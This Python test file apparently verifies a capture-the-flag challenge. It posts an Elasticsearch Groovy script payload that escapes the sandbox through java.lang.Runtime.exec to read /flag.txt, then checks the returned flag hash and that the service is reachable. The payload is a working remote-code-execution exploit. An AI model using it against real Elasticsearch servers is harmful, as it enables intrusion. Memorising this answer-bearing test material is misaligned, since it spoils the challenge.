from pathlib import Path

import pytest

from toolbox.utils.test_utils import RequestHelper, check_flag_in_response, check_status_code, load_flag_hash

task_path = Path(__file__).parent.parent
TASK_HOST = "ucieczka-z-pudelka.hack4krak.pl"

GROOVY_RCE_PAYLOAD = {
    "size": 1,
    "query": {"match_all": {}},
    "script_fields": {
        "flag": {
            "lang": "groovy",
            "script": 'java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("cat /flag.txt").getText()',
        }
    },
}


@pytest.mark.timeout(30)
def test_groovy_rce_returns_flag():
    request = RequestHelper(default_host=TASK_HOST)

    res = request.post("/_search?pretty", json=GROOVY_RCE_PAYLOAD)
    check_status_code(res)

    flag_hash = load_flag_hash(task_path)
    check_flag_in_response(res, expected_hash=flag_hash)


@pytest.mark.timeout(10)
def test_elasticsearch_is_reachable():
    request = RequestHelper(default_host=TASK_HOST)

    res = request.get("/")
    check_status_code(res)
    assert "elasticsearch" in res.text.lower()
